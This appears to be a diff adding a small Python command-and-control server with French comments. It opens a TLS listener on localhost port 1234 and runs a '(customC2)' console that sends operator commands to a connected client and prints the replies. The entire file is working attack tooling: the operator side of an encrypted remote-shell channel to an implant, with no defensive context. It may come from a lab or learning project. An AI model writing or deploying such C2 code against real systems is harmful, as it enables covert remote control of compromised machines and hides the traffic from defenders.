@@ -1,0 +1,36 @@
+import socket
+import ssl
+
+# Créer une socket TCP/IP
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('localhost', 1234))
+sock.listen(1)
+
+# Envelopper la socket dans un contexte SSL
+context =  ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile="./chiffrement/python_ssl.pem",
+                        keyfile="./chiffrement/python_ssl_priv.key")
+
+while True:
+    print("En attente de connexion...")
+    conn, addr = sock.accept()
+
+    # Envelopper la connexion entrante dans un contexte SSL
+    connssl = context.wrap_socket(conn, server_side=True)
+    print(connssl.version())
+
+    try:
+        print("Connecté par", addr)
+        while True:
+            command = input("(customC2) ")
+            if command == "q" or command == "quit" or command == "exit":
+                print('quitting console')
+                break
+            connssl.sendall(command.encode())
+            data = connssl.recv(1024)
+            if not data:
+                break
+            print(data.decode())
+    finally:
+        connssl.shutdown(socket.SHUT_RDWR)
+        connssl.close()
